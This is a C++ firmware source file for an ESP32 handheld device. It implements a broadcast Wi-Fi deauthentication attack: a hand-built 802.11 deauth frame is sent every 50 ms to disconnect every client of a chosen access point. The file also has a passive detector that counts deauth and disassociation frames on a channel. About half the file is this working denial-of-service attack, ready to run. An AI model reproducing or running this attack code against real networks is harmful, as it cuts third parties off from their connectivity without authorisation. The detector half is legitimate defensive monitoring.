/*
 * wifi_deauth_extras — broadcast deauth (kick ALL clients on an AP at
 * once) and passive deauth detector.
 */
#include "app.h"
#include "ui.h"
#include "input.h"
#include "radio.h"
#include "wifi_types.h"
#include <WiFi.h>
#include <esp_wifi.h>

/* ========== Broadcast deauth: attack every client of an AP ========== */

static volatile bool     s_b_running = false;
static volatile uint32_t s_b_sent    = 0;

static uint8_t s_b_frame[26] = {
    0xC0, 0x00, 0x00, 0x00,
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,   /* dst = broadcast */
    0,0,0,0,0,0,                          /* src = AP */
    0,0,0,0,0,0,                          /* bssid = AP */
    0x00, 0x00,
    0x07, 0x00,
};

static uint8_t s_b_target[6];
static uint8_t s_b_channel;

static void broad_task(void *)
{
    esp_wifi_set_channel(s_b_channel, WIFI_SECOND_CHAN_NONE);
    memcpy(s_b_frame + 10, s_b_target, 6);
    memcpy(s_b_frame + 16, s_b_target, 6);
    while (s_b_running) {
        esp_wifi_80211_tx(WIFI_IF_STA, s_b_frame, sizeof(s_b_frame), false);
        s_b_sent++;
        delay(50);
    }
    vTaskDelete(nullptr);
}

void feat_wifi_deauth_broadcast(void)
{
    radio_switch(RADIO_WIFI);
    WiFi.mode(WIFI_STA);
    esp_wifi_set_promiscuous(true);

    if (!g_last_selected_valid) {
        ui_toast("scan+select AP first", COL_WARN, 1500);
        esp_wifi_set_promiscuous(false);
        return;
    }
    memcpy(s_b_target, g_last_selected_ap.bssid, 6);
    s_b_channel = g_last_selected_ap.channel ? g_last_selected_ap.channel : 1;
    s_b_sent = 0;
    s_b_running = true;
    xTaskCreate(broad_task, "deauth_b", 3072, nullptr, 4, nullptr);

    ui_clear_body();
    ui_draw_footer("`=stop");
    auto &d = M5Cardputer.Display;
    d.setTextColor(COL_BAD, COL_BG);
    d.setCursor(4, BODY_Y + 2); d.print(">> BCAST DEAUTH <<");
    d.setTextColor(COL_FG, COL_BG);
    d.setCursor(4, BODY_Y + 22);
    d.printf("%02X:%02X:%02X:%02X:%02X:%02X ch%u",
             s_b_target[0], s_b_target[1], s_b_target[2],
             s_b_target[3], s_b_target[4], s_b_target[5], s_b_channel);

    uint32_t last = 0;
    while (true) {
        if (millis() - last > 300) {
            last = millis();
            d.fillRect(0, BODY_Y + 40, SCR_W, 30, COL_BG);
            d.setTextColor(COL_GOOD, COL_BG);
            d.setCursor(4, BODY_Y + 40);
            d.printf("frames: %lu", (unsigned long)s_b_sent);
            ui_draw_status(radio_name(), "dbcast");
        }
        uint16_t k = input_poll();
        if (k == PK_NONE) { delay(20); continue; }
        if (k == PK_ESC) break;
    }
    s_b_running = false;
    delay(150);
    esp_wifi_set_promiscuous(false);
    g_last_selected_valid = false;
}

/* ========== Deauth detector: passively count deauth frames ========== */

static volatile uint32_t s_det_count = 0;
static volatile uint32_t s_det_total = 0;
static uint8_t s_det_last_bssid[6] = {0};

static void det_cb(void *buf, wifi_promiscuous_pkt_type_t type)
{
    if (type != WIFI_PKT_MGMT) return;
    const wifi_promiscuous_pkt_t *pkt = (const wifi_promiscuous_pkt_t *)buf;
    if (pkt->rx_ctrl.sig_len < 26) return;
    uint8_t fc = pkt->payload[0];
    uint8_t subtype = (fc >> 4) & 0xF;
    /* 0xC = deauth, 0xA = disassociation */
    if (subtype == 0xC || subtype == 0xA) {
        s_det_count++;
        s_det_total++;
        memcpy((void *)s_det_last_bssid, pkt->payload + 16, 6);
    }
}

void feat_wifi_deauth_detect(void)
{
    radio_switch(RADIO_WIFI);
    WiFi.mode(WIFI_STA);
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_rx_cb(det_cb);

    s_det_count = 0;
    s_det_total = 0;
    uint8_t ch = 1;
    esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);

    ui_clear_body();
    ui_draw_footer(";/.=channel  `=stop");
    uint32_t last = 0;
    uint32_t window_ms = millis();
    uint32_t window_count = 0;
    while (true) {
        if (millis() - last > 300) {
            last = millis();
            if (millis() - window_ms > 1000) {
                window_count = s_det_count;
                s_det_count = 0;
                window_ms = millis();
            }
            auto &d = M5Cardputer.Display;
            ui_clear_body();
            d.setTextColor(COL_ACCENT, COL_BG);
            d.setCursor(4, BODY_Y + 2); d.print("DEAUTH DETECT");
            d.drawFastHLine(4, BODY_Y + 12, 100, COL_ACCENT);
            d.setTextColor(COL_FG, COL_BG);
            d.setCursor(4, BODY_Y + 22); d.printf("channel : %u", ch);
            d.setTextColor(window_count > 5 ? COL_BAD : COL_GOOD, COL_BG);
            d.setCursor(4, BODY_Y + 34); d.printf("rate    : %lu/s", (unsigned long)window_count);
            d.setTextColor(COL_FG, COL_BG);
            d.setCursor(4, BODY_Y + 46); d.printf("total   : %lu", (unsigned long)s_det_total);
            if (s_det_total > 0) {
                d.setTextColor(COL_DIM, COL_BG);
                d.setCursor(4, BODY_Y + 60);
                d.printf("last BSSID %02X:%02X:%02X:%02X:%02X:%02X",
                         s_det_last_bssid[0], s_det_last_bssid[1], s_det_last_bssid[2],
                         s_det_last_bssid[3], s_det_last_bssid[4], s_det_last_bssid[5]);
            }
            ui_draw_status(radio_name(), "dauth-det");
        }
        uint16_t k = input_poll();
        if (k == PK_NONE) { delay(20); continue; }
        if (k == PK_ESC) break;
        if (k == ';' || k == PK_UP)   { if (ch < 13) { ch++; esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE); } }
        if (k == '.' || k == PK_DOWN) { if (ch > 1)  { ch--; esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE); } }
    }
    esp_wifi_set_promiscuous(false);
}
